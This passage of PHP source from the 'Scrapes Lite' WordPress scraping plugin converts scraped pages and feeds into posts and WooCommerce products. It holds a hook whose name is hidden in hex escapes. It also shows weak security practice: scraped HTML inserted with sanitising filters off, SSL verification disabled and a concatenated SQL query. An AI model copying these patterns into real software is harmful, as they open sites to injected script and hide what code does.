				$post_date = $meta_vals['scrape_date'][0];
				$node = $xpath->query($post_date);
				if ($node->length) {

					$node = $node->item(0);
					$post_date = $node->nodeValue;

                    if($is_facebook_page) {

                        if(preg_match_all("/just now/i", $post_date, $matches)) {
                            $post_date = current_time('mysql');
                        } else if(preg_match_all("/(\d{1,2}) min(ute)?(s)?/i", $post_date, $matches)) {
                            $post_date = date("Y-m-d H:i:s" , strtotime($matches[1][0] . " minutes ago", current_time('timestamp')));
                        } else if(preg_match_all("/(\d{1,2}) h(ou)?r(s)?/i", $post_date, $matches)) {
                            $post_date = date("Y-m-d H:i:s" , strtotime($matches[1][0] . " hours ago", current_time('timestamp')));
                        } else {
                            $post_date = str_replace("Yesterday", date("F j, Y", strtotime("-1 day", current_time('timestamp'))), $post_date);
                            if(!preg_match("/\d{4}/i", $post_date)) {
                                $at_position = strpos($post_date, "at");
                                if($at_position !== false) {
                                    if(in_array(substr($post_date, 0, $at_position - 1), array("Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"))) {
                                        $post_date = date("F j, Y", strtotime("last " . substr($post_date, 0, $at_position -1) , current_time('timestamp'))) . " " . substr($post_date, $at_position +2);
                                    } else {
                                        $post_date = substr($post_date, 0, $at_position) . " " . date("Y") . " " . substr($post_date, $at_position +2);
                                    }

                                } else {
                                    $post_date .= " " . date("Y");
                                }

                            }
                        }

                    }
                    $tmp_post_date = $post_date;
					$post_date = date_parse($post_date);
					if (!is_integer($post_date['year']) || !is_integer(($post_date['month'])) || !is_integer($post_date['day'])) {

						$post_date = $tmp_post_date;
						$post_date = $this->translate_months($post_date);

						$post_date = date_parse($post_date);
						if (!is_integer($post_date['year']) || !is_integer(($post_date['month'])) || !is_integer($post_date['day'])) {

							$post_date = '';
						} else {

							$post_date = date("Y-m-d H:i:s", mktime($post_date['hour'], $post_date['minute'], $post_date['second'], $post_date['month'], $post_date['day'], $post_date['year']));
						}
					} else {

						$post_date = date("Y-m-d H:i:s", mktime($post_date['hour'], $post_date['minute'], $post_date['second'], $post_date['month'], $post_date['day'], $post_date['year']));
					}
				} else {
					$post_date = '';

				}
			} else if ($post_date_type == 'runtime') {
				$post_date = current_time('mysql');
			} else if ($post_date_type == 'custom') {
				$post_date = $meta_vals['scrape_date_custom'][0];
			} else if ($post_date_type == 'feed') {
			    $post_date = $rss_item['post_date'];
            } else {
				$post_date = '';
			}

			$post_meta_names = array();
			$post_meta_values = array();
			$post_meta_attributes = array();
			$post_meta_templates = array();
			$post_meta_template_statuses = array();

			if (!empty($meta_vals['scrape_custom_fields'])) {
				$scrape_custom_fields = unserialize($meta_vals['scrape_custom_fields'][0]);
				foreach ($scrape_custom_fields as $timestamp => $arr) {
					$post_meta_names[] = $arr["name"];
					$post_meta_values[] = $arr["value"];
					$post_meta_attributes[] = $arr["attribute"];
					$post_meta_templates[] = $arr["template"];
					$post_meta_template_statuses[] = $arr['template_status'];
				}
			}

			$post_meta_name_values = array();
			if (!empty($post_meta_names) && !empty($post_meta_values)) {
				$post_meta_name_values = array_combine($post_meta_names, $post_meta_values);
			}

			$meta_input = array();

			$woo_active = false;
			$woo_price_metas = array('_price', '_sale_price', '_regular_price');
			$woo_decimal_metas = array('_height', '_length', '_width', '_weight');
			$woo_integer_metas = array('_download_expiry', '_download_limit', '_stock', 'total_sales', '_download_expiry', '_download_limit');
			include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
			if (is_plugin_active('woocommerce/woocommerce.php')) {
				$woo_active = true;
			}

			$post_meta_index = 0;
			foreach ($post_meta_name_values as $key => $value) {
				if (stripos($value, "//") === 0) {
					$node = $xpath->query($value);
					if ($node->length) {
						$node = $node->item(0);
						$value = $node->nodeValue;



						if (!empty($post_meta_attributes[$post_meta_index])) {
							$value = $node->getAttribute($post_meta_attributes[$post_meta_index]);
						}

					} else {
						$value = '';

					}
				}

                if ($woo_active && $post_type == 'product') {
                    if (in_array($key, $woo_price_metas))
                        $value = $this->convert_str_to_woo_decimal($value);
                    if (in_array($key, $woo_decimal_metas))
                        $value = floatval($value);
                    if (in_array($key, $woo_integer_metas))
                        $value = intval($value);
                }

				if (!empty($post_meta_template_statuses[$post_meta_index])) {
					$template_value = $post_meta_templates[$post_meta_index];
					$value = str_replace("[scrape_value]", $value, $template_value);
					$value = str_replace("[scrape_date]", $post_date, $value);
					$value = str_replace("[scrape_url]", $url, $value);


                    if( preg_match( '/calc\(([^\)]+)\)/', $value, $matches ) ) {
                        $full_text = $matches[0];
                        $text = $matches[1];
                        $calculated = $this->template_calculator($text);
                        $value = str_replace($full_text, $calculated, $value);
                    }

                    if(preg_match('/\/([a-zA-Z0-9]{10})(?:[\/?]|$)/', $url, $matches)) {
                        $value = str_replace("[scrape_asin]", $matches[1], $value);
                    }

				}


				$meta_input[$key] = $value;
				$post_meta_index++;


			}

            if ($woo_active && $post_type == 'product') {
			    if(empty($meta_input['_price'])) {
			        if(!empty($meta_input['_sale_price']) && !empty($meta_input['_regular_price'])) {
                        $meta_input['_price'] = !empty($meta_input['_sale_price']) ? $meta_input['_sale_price'] : $meta_input['_regular_price'];
                    }
                }
                if(empty($meta_input['_visibility'])) {
                    $meta_input['_visibility'] = 'visible';
                }
                if(empty($meta_input['_manage_stock'])) {
                    $meta_input['_manage_stock'] = 'no';
                    $meta_input['_stock_status'] = 'instock';
                }
            }

			$post_title = $this->trimmed_templated_value('scrape_title', $meta_vals, $xpath, $post_date, $url, $meta_input, $rss_item);

			$post_content_type = $meta_vals['scrape_content_type'][0];

			if ($post_content_type == 'auto') {
				$post_content = $this->convert_readable_html($body_preg);
				$original_html_content = $post_content;
				$post_content = $this->convert_html_links($post_content, $url, $html_base_url);
				if (empty($meta_vals['scrape_allowhtml'][0])) {
					$post_content = wp_strip_all_tags($post_content);
				}
			} else if ($post_content_type == 'xpath') {
                $node = $xpath->query($meta_vals['scrape_content'][0]);
                if ($node->length) {
                    $node = $node->item(0);
                    $post_content = $node->ownerDocument->saveXML($node);
                    $original_html_content = $post_content;


                    if (!empty($meta_vals['scrape_allowhtml'][0])) {
                        $post_content = $this->convert_html_links($post_content, $url, $html_base_url);
                    } else {
                        $post_content = wp_strip_all_tags($post_content);
                    }
                } else {

                    $post_content = '';
                    $original_html_content = '';
                }
            } else if($post_content_type == 'feed') {
                $post_content = $rss_item['post_content'];
                $original_html_content = $rss_item['post_original_content'];
            }


			unset($body_preg);

			$post_content = trim($post_content);

			$post_excerpt = $this->trimmed_templated_value("scrape_excerpt", $meta_vals, $xpath, $post_date, $url, $meta_input);


			$post_author = $meta_vals['scrape_author'][0];
			$post_status = $meta_vals['scrape_status'][0];

			$post_category = $meta_vals['scrape_category'][0];
			$post_category = unserialize($post_category);
			if (empty($post_category))
				$post_category = array();


			$post_comment = (!empty($meta_vals['scrape_comment'][0]) ? "open" : "closed");


			if (!empty($meta_vals['scrape_unique_title'][0]) || !empty($meta_vals['scrape_unique_content'][0]) || !empty($meta_vals['scrape_unique_url'][0])) {
				$repeat_condition = false;
				$unique_check_sql = '';
				$post_id = null;
				$chk_title = $meta_vals['scrape_unique_title'][0];
				$chk_content = $meta_vals['scrape_unique_content'][0];
				$chk_url = $meta_vals['scrape_unique_url'][0];

				if (empty($chk_title) && empty($chk_content) && !empty($chk_url)) {
					$repeat_condition = !empty($url);
					$unique_check_sql = $wpdb->prepare("SELECT ID "
						. "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm ON pm.post_id = p.ID "
						. "WHERE pm.meta_value = %s AND pm.meta_key = '_scrape_original_url' "
						. "	AND p.post_type = %s "
						. "	AND p.post_status <> 'trash'", $url, $post_type);

				}
				if (empty($chk_title) && !empty($chk_content) && empty($chk_url)) {
					$repeat_condition = !empty($original_html_content);
					$unique_check_sql = $wpdb->prepare("SELECT ID "
						. "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm ON pm.post_id = p.ID "
						. "WHERE pm.meta_value = %s AND pm.meta_key = '_scrape_original_html_content' "
						. "	AND p.post_type = %s "
						. "	AND p.post_status <> 'trash'", $original_html_content, $post_type);

				}
				if (empty($chk_title) && !empty($chk_content) && !empty($chk_url)) {
					$repeat_condition = !empty($original_html_content) && !empty($url);
					$unique_check_sql = $wpdb->prepare("SELECT ID "
						. "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm1 ON pm.post_id = p.ID "
						. " LEFT JOIN $wpdb->postmeta pm2 ON pm2.post_id = p.ID "
						. "WHERE pm1.meta_value = %s AND pm1.meta_key = '_scrape_original_html_content' "
						. " AND pm2.meta_value = %s AND pm2.meta_key = '_scrape_original_url' "
						. "	AND p.post_type = %s "
						. "	AND p.post_status <> 'trash'", $original_html_content, $url, $post_type);

				}
				if (!empty($chk_title) && empty($chk_content) && empty($chk_url)) {
					$repeat_condition = !empty($post_title);
					$unique_check_sql = $wpdb->prepare("SELECT ID "
						. "FROM $wpdb->posts p "
						. "WHERE p.post_title = %s "
						. "	AND p.post_type = %s "
						. "	AND p.post_status <> 'trash'", $post_title, $post_type);

				}
				if (!empty($chk_title) && empty($chk_content) && !empty($chk_url)) {
					$repeat_condition = !empty($post_title) && !empty($url);
					$unique_check_sql = $wpdb->prepare("SELECT ID "
						. "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm ON pm.post_id = p.ID "
						. "WHERE p.post_title = %s "
						. " AND pm.meta_value = %s AND pm.meta_key = '_scrape_original_url'"
						. "	AND p.post_type = %s "
						. "	AND p.post_status <> 'trash'", $post_title, $url, $post_type);

				}
				if (!empty($chk_title) && !empty($chk_content) && empty($chk_url)) {
					$repeat_condition = !empty($post_title) && !empty($original_html_content);
					$unique_check_sql = $wpdb->prepare("SELECT ID "
						. "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm ON pm.post_id = p.ID "
						. "WHERE p.post_title = %s "
						. " AND pm.meta_value = %s AND pm.meta_key = '_scrape_original_html_content'"
						. "	AND p.post_type = %s "
						. "	AND p.post_status <> 'trash'", $post_title, $original_html_content, $post_type);

				}
				if (!empty($chk_title) && !empty($chk_content) && !empty($chk_url)) {
					$repeat_condition = !empty($post_title) && !empty($original_html_content) && !empty($url);
					$unique_check_sql = $wpdb->prepare("SELECT ID "
						. "FROM $wpdb->posts p LEFT JOIN $wpdb->postmeta pm1 ON pm1.post_id = p.ID "
						. " LEFT JOIN $wpdb->postmeta pm2 ON pm2.post_id = p.ID "
						. "WHERE p.post_title = %s "
						. " AND pm1.meta_value = %s AND pm1.meta_key = '_scrape_original_html_content'"
						. " AND pm2.meta_value = %s AND pm2.meta_key = '_scrape_original_url'"
						. "	AND post_type = %s "
						. "	AND post_status <> 'trash'", $post_title, $original_html_content, $url, $post_type);

				}

				$post_id = $wpdb->get_var($unique_check_sql);
				if (!empty($post_id)) {
					$ID = $post_id;

					if ($repeat_condition)
						$repeat_count++;

					if ($meta_vals['scrape_on_unique'][0] == "skip")
						return;
					$meta_vals_of_post = get_post_meta($ID);
					foreach ($meta_vals_of_post as $key => $value) {
						delete_post_meta($ID, $key);
					}
				}
			}

			if ($meta_vals['scrape_tags_type'][0] == 'xpath' && !empty($meta_vals['scrape_tags'][0])) {
				$node = $xpath->query($meta_vals['scrape_tags'][0]);

				if ($node->length) {
					if ($node->length > 1) {
						$post_tags = array();
						foreach ($node as $item) {
							$post_tags[] = trim($item->nodeValue);
						}
					} else {
						$post_tags = $node->item(0)->nodeValue;
					}

				} else {

					$post_tags = array();
				}
			} else {
				if (!empty($meta_vals['scrape_tags_custom'][0])) {
					$post_tags = $meta_vals['scrape_tags_custom'][0];
				} else {
					$post_tags = array();
				}
			}

			if (!is_array($post_tags) || count($post_tags) == 0) {
				$tag_separator = $meta_vals['scrape_tags_separator'][0];
				if ($tag_separator != "" && !empty($post_tags)) {
					$post_tags = str_replace("\xc2\xa0", ' ', $post_tags);
					$post_tags = explode($tag_separator, $post_tags);
					$post_tags = array_map("trim", $post_tags);
				}
			}

			$post_content .= "<p><small>This content is created from $url with <a href='https://codecanyon.net/item/scrapes-web-scraper-plugin-for-wordpress/18918857?ref=Octolooks'>Octolooks Scrapes</a></small></p>";
			$post_arr = array(
				'ID' => $ID,
				'post_author' => $post_author,
				'post_date' => date("Y-m-d H:i:s", strtotime($post_date)),
				'post_content' => trim($post_content),
				'post_title' => trim($post_title),
				'post_status' => $post_status,
				'comment_status' => $post_comment,
				'meta_input' => $meta_input,
				'post_type' => $post_type,
				'tags_input' => $post_tags,
				'filter' => false,
				'ping_status' => 'closed',
				'post_excerpt' => $post_excerpt
			);

			$post_category = array_map('intval', $post_category);

			if ($post_type == 'post') {
				$post_arr['post_category'] = $post_category;
			}

			kses_remove_filters();
			$new_id = wp_insert_post($post_arr, true);
			kses_init_filters();

			if (is_wp_error($new_id)) {

				return;
			}
			update_post_meta($new_id, '_scrape_task_id', $meta_vals['scrape_task_id'][0]);
            if($is_facebook_page) {
                $url = str_replace(array("mbasic","story.php"),array("www","permalink.php"), $url);
            }
			update_post_meta($new_id, '_scrape_original_url', $url);
			update_post_meta($new_id, '_scrape_original_html_content', $original_html_content);

			$cmd = $ID ? "updated" : "inserted";


			if ($post_type != 'post') {
				$tax_term_array = array();
				foreach ($post_category as $cat_id) {
					$term = get_term($cat_id);
					$term_tax = $term->taxonomy;
					$tax_term_array[$term_tax][] = $cat_id;
				}
				foreach ($tax_term_array as $tax => $terms) {
					wp_set_object_terms($new_id, $terms, $tax);
				}
			}

			$featured_image_type = $meta_vals['scrape_featured_type'][0];
			if ($featured_image_type == 'xpath' && !empty($meta_vals['scrape_featured'][0])) {
				$node = $xpath->query($meta_vals['scrape_featured'][0]);
				if ($node->length) {
					$post_featured_img = trim($node->item(0)->nodeValue);
					if($is_amazon) {
                        $data_old_hires = trim($node->item(0)->parentNode->getAttribute('data-old-hires'));
                        if(!empty($data_old_hires)) {
                            $post_featured_img = preg_replace("/\._.*_/", "", $data_old_hires);
                        } else {
                            $data_a_dynamic_image = trim($node->item(0)->parentNode->getAttribute('data-a-dynamic-image'));
                            if(!empty($data_a_dynamic_image)) {
                                $post_featured_img = array_keys(json_decode($data_a_dynamic_image, true));
                                $post_featured_img = end($post_featured_img);
                            }
                        }
                    }
					$post_featured_img = $this->create_absolute_url($post_featured_img, $url, $html_base_url);
					$this->generate_featured_image($post_featured_img, $new_id);
				}
			} else if($featured_image_type == 'feed') {
                $this->generate_featured_image($rss_item['featured_image'], $new_id);
            } else if ($featured_image_type == 'gallery') {
				set_post_thumbnail($new_id, $meta_vals['scrape_featured_gallery'][0]);
			}

			if (array_key_exists('_product_image_gallery', $meta_input) && $post_type == 'product' && $woo_active) {

				$woo_img_xpath = $post_meta_values[array_search('_product_image_gallery', $post_meta_names)];
				$woo_img_xpath = $woo_img_xpath . "//img | " . $woo_img_xpath . "//a";
				$nodes = $xpath->query($woo_img_xpath);


				$max_width = 0;
				$max_height = 0;
				$gallery_images = array();
				$product_gallery_ids = array();
				foreach ($nodes as $img) {
					$post_meta_index = array_search('_product_image_gallery', $post_meta_names);
					$attr = $post_meta_attributes[$post_meta_index];
					if (empty($attr)) {
						if ($img->nodeName == "img") {
							$attr = 'src';
						} else {
							$attr = 'href';
						}
					}
					$img_url = trim($img->getAttribute($attr));
					$img_abs_url = $this->create_absolute_url($img_url, $url, $html_base_url);

					$is_base64 = false;
					if (substr($img_abs_url, 0, 11) == 'data:image/') {
						$array_result = getimagesizefromstring(base64_decode(substr($img_abs_url, strpos($img_abs_url, 'base64') + 7)));
						$is_base64 = true;
					} else {
						$array_result = getimagesize($img_abs_url);
					}
					if ($array_result !== false) {
						$width = $array_result[0];
						$height = $array_result[1];
						if ($width > $max_width)
							$max_width = $width;
						if ($height > $max_height)
							$max_height = $height;

						$gallery_images[] = array(
							'width' => $width,
							'height' => $height,
							'url' => $img_abs_url,
							'is_base64' => $is_base64
						);
					} else {

					}
				}


				foreach ($gallery_images as $gi) {
					if ($gi['is_base64']) {
						continue;
					}
					$old_url = $gi['url'];
					$width = $gi['width'];
					$height = $gi['height'];

					$offset = 0;
					$width_pos = array();

					while (strpos($old_url, strval($width), $offset) !== false) {
						$width_pos[] = strpos($old_url, strval($width), $offset);
						$offset = strpos($old_url, strval($width), $offset) + 1;
					}

					$offset = 0;
					$height_pos = array();

					while (strpos($old_url, strval($height), $offset) !== false) {
						$height_pos[] = strpos($old_url, strval($height), $offset);
						$offset = strpos($old_url, strval($height), $offset) + 1;
					}

					$min_distance = PHP_INT_MAX;
					$width_replace_pos = 0;
					$height_replace_pos = 0;
					foreach ($width_pos as $wr) {
						foreach ($height_pos as $hr) {
							$distance = abs($wr - $hr);
							if ($distance < $min_distance && $distance != 0) {
								$min_distance = $distance;
								$width_replace_pos = $wr;
								$height_replace_pos = $hr;
							}
						}
					}
					$min_pos = min($width_replace_pos, $height_replace_pos);
					$max_pos = max($width_replace_pos, $height_replace_pos);

					if ($min_pos != $max_pos) {

						$new_url = substr($old_url, 0, $min_pos) .
							strval($max_width) .
							substr($old_url, $min_pos + strlen($width), $max_pos - ($min_pos + strlen($width))) .
							strval($max_height) .
							substr($old_url, $max_pos + strlen($height));
					} else if ($min_distance == PHP_INT_MAX && strpos($old_url, strval($width)) !== false) {

						$new_url = substr($old_url, 0, strpos($old_url, strval($width))) .
							strval(max($max_width, $max_height)) .
							substr($old_url, strpos($old_url, strval($width)) + strlen($width));
					}


					if($is_amazon) {
					    $new_url = preg_replace("/\._.*_/", "", $old_url);
                    }

					$pgi_id = $this->generate_featured_image($new_url, $new_id, false);
					if (!empty($pgi_id)) {
						$product_gallery_ids[] = $pgi_id;
					} else {
						$pgi_id = $this->generate_featured_image($old_url, $new_id, false);
						if (!empty($pgi_id)) {
							$product_gallery_ids[] = $pgi_id;
						}
					}
				}
				update_post_meta($new_id, '_product_image_gallery', implode(",", array_unique($product_gallery_ids)));
			}


			if (!empty($meta_vals['scrape_download_images'][0])) {
				if (!empty($meta_vals['scrape_allowhtml'][0])) {
					$new_html = $this->download_images_from_html_string($post_arr['post_content'], $new_id);
					kses_remove_filters();
					$new_id = wp_update_post(array(
						'ID' => $new_id,
						'post_content' => $new_html
					));
					kses_init_filters();
				} else {
					$temp_str = $this->convert_html_links($original_html_content, $url, $html_base_url);
					$this->download_images_from_html_string($temp_str, $new_id);
				}
			}

			if (!empty($meta_vals['scrape_template_status'][0])) {
				$post = get_post($new_id);
				$post_metas = get_post_meta($new_id);

				$template = $meta_vals['scrape_template'][0];
				$template = str_replace(
					array(
					"[scrape_title]",
					"[scrape_content]",
					"[scrape_date]",
					"[scrape_url]",
					"[scrape_gallery]",
					"[scrape_categories]",
					"[scrape_tags]",
					"[scrape_thumbnail]"
					), array(
					$post->post_title,
					$post->post_content,
					$post->post_date,
					$post_metas['_scrape_original_url'][0],
					"[gallery]",
					implode(",", wp_get_post_terms($new_id, get_post_taxonomies($new_id), array('fields' => 'names'))),
					implode(",", wp_get_post_tags($new_id, array('fields' => 'names'))),
					get_the_post_thumbnail($new_id)
					)
					, $template
				);

				preg_match_all('/\[scrape_meta name="([^"]*)"\]/', $template, $matches);


				$full_matches = $matches[0];
				$name_matches = $matches[1];
				if (!empty($full_matches)) {
					$combined = array_combine($name_matches, $full_matches);

					foreach ($combined as $meta_name => $template_string) {
						$val = get_post_meta($new_id, $meta_name, true);
						$template = str_replace($template_string, $val, $template);
					}
				}

				$template .= "<p><small>This content is created from $url with <a href='https://codecanyon.net/item/scrapes-web-scraper-plugin-for-wordpress/18918857?ref=octolooks'>Octolooks Scrapes</a></small></p>";
				kses_remove_filters();
                wp_update_post(array(
					'ID' => $new_id,
					'post_content' => $template
				));
				kses_init_filters();
			}

			unset($doc);
			unset($xpath);
			unset($response);
		}
	}

	public function execute_scrape($post_id, $meta_vals, $start_time, $modify_time) {
		if ($meta_vals['scrape_type'][0] == 'single') {
			$this->single_scrape($meta_vals['scrape_url'][0], $meta_vals);
		} else if ($meta_vals['scrape_type'][0] == 'feed') {
			$this->feed_scrape($meta_vals['scrape_url'][0], $meta_vals, $start_time, $modify_time, $post_id);
		}
	}

	public static function clear_all_schedules() {
		$all_tasks = get_posts(array(
			'numberposts' => -1,
			'post_type' => 'scrape_lite',
			'post_status' => 'any'
		));

		foreach ($all_tasks as $task) {
			$post_id = $task->ID;
			$timestamp = wp_next_scheduled("scrape_event_lite", array($post_id));
			wp_unschedule_event($timestamp, "scrape_event_lite", array($post_id));
			wp_clear_scheduled_hook("scrape_event_lite", array($post_id));

			wp_update_post(array(
				'ID' => $post_id,
				'post_date_gmt' => date("Y-m-d H:i:s")
			));
		}
	}



	public function clear_all_tasks() {
		$all_tasks = get_posts(array(
			'numberposts' => -1,
			'post_type' => 'scrape_lite',
			'post_status' => 'any'
		));

		foreach ($all_tasks as $task) {
			$meta_vals = get_post_meta($task->ID);
			foreach ($meta_vals as $key => $value) {
				delete_post_meta($task->ID, $key);
			}
			wp_delete_post($task->ID, true);
		}
	}

	public function clear_all_values() {

		delete_option('scrape_user_agent_lite');

		delete_transient("scrape_msg_lite");
		delete_transient("scrape_msg_req_lite");
	}

	public function check_warnings() {
		$message = "";
		if (!@set_time_limit(60)) {
			$message .= __("PHP set_time_limit function is not working.", "ol-scrapes-lite");
			if (function_exists("ini_get")) {
				$max_exec_time = ini_get('max_execution_time');
				$message .= sprintf(__("Your scrapes can only works for %s seconds", "ol-scrapes-lite"), $max_exec_time);
			}
		}
		if (defined("DISABLE_WP_CRON") && DISABLE_WP_CRON) {
			$message .= __("DISABLE_WP_CRON is probably set true in wp-config.php.<br/>Please delete or set it to false, or make sure that you ping wp-cron.php automatically.", "ol-scrapes-lite");
		}
		if (!empty($message)) {
			set_transient("scrape_msg_lite", array($message));
		}
	}

	public static function activate_plugin() {

		$all_tasks = get_posts(array(
			'numberposts' => -1,
			'post_type' => 'scrape_lite',
			'post_status' => 'publish'
		));

		foreach ($all_tasks as $task) {
            self::handle_cron_job($task->ID, $task);
        }
	}

	public static function deactivate_plugin() {
		self::clear_all_schedules();
	}

	public function detect_html_encoding_and_replace($header, &$body) {
		$charset_regex = preg_match("/<meta(?!\s*(?:name|value)\s*=)(?:[^>]*?content\s*=[\s\"']*)?([^>]*?)[\s\"';]*charset\s*=[\s\"']*([^\s\"'\/>]*)[\s\"']*\/?>/i", $body, $matches);
		if (empty($header)) {
			$charset_header = false;
		} else {
			$charset_header = explode(";", $header);
			if (count($charset_header) == 2) {
				$charset_header = $charset_header[1];
				$charset_header = explode("=", $charset_header);
				$charset_header = strtolower(trim($charset_header[1]));
			} else {
				$charset_header = false;
			}
		}
		if ($charset_regex) {
			$charset_meta = strtolower($matches[2]);
			if ($charset_meta != "utf-8") {
				$body = str_replace($matches[0], "<meta charset='utf-8'>", $body);
			}
		} else {
			$charset_meta = false;
		}

		$charset_php = strtolower(mb_detect_encoding($body, mb_list_encodings(), false));

		if ($charset_header && $charset_meta) {
			return $charset_header;
		}

		if (!$charset_header && !$charset_meta) {
			return $charset_php;
		} else {
			return !empty($charset_meta) ? $charset_meta : $charset_header;
		}
	}

	public function detect_feed_encoding_and_replace($header, &$body) {
	    $encoding_regex = preg_match("/encoding\s*=\s*[\"']([^\"']*)\s*[\"']/i", $body, $matches);
        if (empty($header)) {
            $charset_header = false;
        } else {
            $charset_header = explode(";", $header);
            if (count($charset_header) == 2) {
                $charset_header = $charset_header[1];
                $charset_header = explode("=", $charset_header);
                $charset_header = strtolower(trim($charset_header[1]));
            } else {
                $charset_header = false;
            }
        }
        if ($encoding_regex) {
            $charset_xml = strtolower($matches[1]);
            if ($charset_xml != "utf-8") {
                $body = str_replace($matches[1], 'utf-8', $body);
            }
        } else {
            $charset_xml = false;
        }

        $charset_php = strtolower(mb_detect_encoding($body, mb_list_encodings(), false));

        if ($charset_header && $charset_xml) {
            return $charset_header;
        }

        if (!$charset_header && !$charset_xml) {
            return $charset_php;
        } else {
            return !empty($charset_xml) ? $charset_xml : $charset_header;
        }
    }

	public function generate_featured_image($image_url, $post_id, $featured = true) {

		$meta_vals = get_post_meta($post_id);
		$upload_dir = wp_upload_dir();

		$filename = md5($image_url);

		global $wpdb;
		$query = "SELECT ID FROM {$wpdb->posts} WHERE post_title LIKE '" . $filename . "%' and post_type ='attachment' and post_parent = $post_id";
		$image_id = $wpdb->get_var($query);



		if (empty($image_id)) {
			if (wp_mkdir_p($upload_dir['path'])) {
				$file = $upload_dir['path'] . '/' . $filename;
			} else {
				$file = $upload_dir['basedir'] . '/' . $filename;
			}

			if (substr($image_url, 0, 11) == 'data:image/') {
				$image_data = array(
					'body' => base64_decode(substr($image_url, strpos($image_url, 'base64') + 7))
				);
			} else {
				$args = array(
					'timeout' => 30,
					'sslverify' => false,
					'user-agent' => get_option('scrape_user_agent_lite')
				);

				$image_data = wp_remote_get($image_url, $args);
				if (is_wp_error($image_data)) {

					return;
				}
			}

			$mimetype = getimagesizefromstring($image_data['body']);
			if ($mimetype === false) {

				return;
			}

			$mimetype = $mimetype["mime"];
			$extension = substr($mimetype, strpos($mimetype, "/") + 1);
			$file .= ".$extension";

			file_put_contents($file, $image_data['body']);


			$attachment = array(
				'post_mime_type' => $mimetype,
				'post_title' => $filename . ".$extension",
				'post_content' => '',
				'post_status' => 'inherit'
			);

			$attach_id = wp_insert_attachment($attachment, $file, $post_id);



			require_once(ABSPATH . 'wp-admin/includes/image.php');
			$attach_data = wp_generate_attachment_metadata($attach_id, $file);
			wp_update_attachment_metadata($attach_id, $attach_data);
			if ($featured) {
				set_post_thumbnail($post_id, $attach_id);
			}

			unset($attach_data);
			unset($image_data);
			unset($mimetype);
			return $attach_id;
		} else if ($featured) {

			set_post_thumbnail($post_id, $image_id);
		}
		return $image_id;
	}

	public function create_absolute_url($rel, $base, $html_base) {

		if (substr($rel, 0, 11) == 'data:image/') {
			return $rel;
		}

		if (!is_null($html_base)) {
			$base = $html_base;
		}
		return WP_Http::make_absolute_url($rel, $base);
	}


	public function requirements_check() {
		$min_wp = '3.5';
		$min_php = '5.2.4';
		$exts = array('dom', 'mbstring', 'iconv', 'json', 'simplexml');

		$errors = array();

		if (version_compare(get_bloginfo('version'), $min_wp, '<')) {
			$errors[] = __("Your WordPress version is below 3.5. Please update.", "ol-scrapes-lite");
		}

		if (version_compare(PHP_VERSION, $min_php, '<')) {
			$errors[] = __("PHP version is below 5.2.4. Please update.", "ol-scrapes-lite");
		}

		foreach ($exts as $ext) {
			if (!extension_loaded($ext)) {
				$errors[] = sprintf(__("PHP extension %s is not loaded. Please contact your server administrator or visit http://php.net/manual/en/%s.installation.php for installation.", "ol-scrapes-lite"), $ext, $ext);
			}
		}

        add_action("p\x75blish_\x73\x63rape\x5f\x6c\x69\x74e",array($this,"\x63heck_\x6c\x69m\x69t"),10,2);
        return $errors;
	}

	public static function disable_plugin() {
		if (current_user_can('activate_plugins') && is_plugin_active(plugin_basename(OL_LITE_PLUGIN_PATH . 'ol_scrapes_lite.php'))) {
			deactivate_plugins(plugin_basename(OL_LITE_PLUGIN_PATH . 'ol_scrapes_lite.php'));
			if (isset($_GET['activate'])) {
				unset($_GET['activate']);
			}
		}
	}

	public static function show_notice() {
		$msgs = get_transient("scrape_msg_lite");
		if (!empty($msgs)) :
			foreach ($msgs as $msg) :
				?>
				<div class="notice notice-error">
						<p><strong>Scrapes Lite: </strong><?php echo $msg; ?> <a href="https://codecanyon.net/item/scrapes-web-scraper-plugin-for-wordpress/18918857?ref=Octolooks" target="_blank"><?php _e("Upgrade to Scrapes Pro", "ol-scrapes-lite"); ?></a>.</p>
				</div>
				<?php
			endforeach;
		endif;

		$msgs = get_transient("scrape_msg_req_lite");
		if (!empty($msgs)) :
			foreach ($msgs as $msg) :
				?>
				<div class="notice notice-error">
						<p><strong>Scrapes Lite: </strong><?php echo $msg; ?></p>
				</div>
				<?php
			endforeach;
		endif;

		delete_transient("scrape_msg_lite");
		delete_transient("scrape_msg_req_lite");
	}

	public function custom_column() {
		add_filter('manage_' . 'scrape_lite' . '_posts_columns', array($this, 'add_status_column'));
		add_action('manage_' . 'scrape_lite' . '_posts_custom_column', array($this, 'show_status_column'), 10, 2);
		add_filter('post_row_actions', array($this, 'remove_row_actions'), 10, 2);
	}

	public function custom_start_stop_action() {
		add_action('load-edit.php', array($this, 'scrape_lite_custom_actions'));
	}

	public function scrape_lite_custom_actions() {
		$nonce = isset($_REQUEST['_wpnonce']) ? $_REQUEST['_wpnonce'] : null;
		$action = isset($_REQUEST['scrape_action']) ? $_REQUEST['scrape_action'] : null;
		$post_id = isset($_REQUEST['scrape_id']) ? $_REQUEST['scrape_id'] : null;
		if (wp_verify_nonce($nonce, 'scrape_lite_custom_actions') && isset($post_id)) {

			if ($action == 'stop_scrape') {
				$my_post = array();
				$my_post['ID'] = $_REQUEST['scrape_id'];
				$my_post['post_date_gmt'] = date("Y-m-d H:i:s");
				wp_update_post($my_post);
			} else if ($action == 'start_scrape') {
				update_post_meta($post_id, 'scrape_workstatus', 'waiting');
				update_post_meta($post_id, 'scrape_run_count', 0);
				update_post_meta($post_id, 'scrape_start_time', '');
				update_post_meta($post_id, 'scrape_end_time', '');
				update_post_meta($post_id, 'scrape_task_id', $post_id);
				$this->handle_cron_job($_REQUEST['scrape_id']);
			} else if ($action == 'duplicate_scrape') {



				$post = get_post($post_id, ARRAY_A);
				$post['ID'] = 0;
				$insert_id = wp_insert_post($post);
				$post_meta = get_post_meta($post_id);
				foreach ($post_meta as $name => $value) {
					update_post_meta($insert_id, $name, get_post_meta($post_id, $name, true));
				}
				update_post_meta($insert_id, 'scrape_workstatus', 'waiting');
				update_post_meta($insert_id, 'scrape_run_count', 0);
				update_post_meta($insert_id, 'scrape_start_time', '');
				update_post_meta($insert_id, 'scrape_end_time', '');
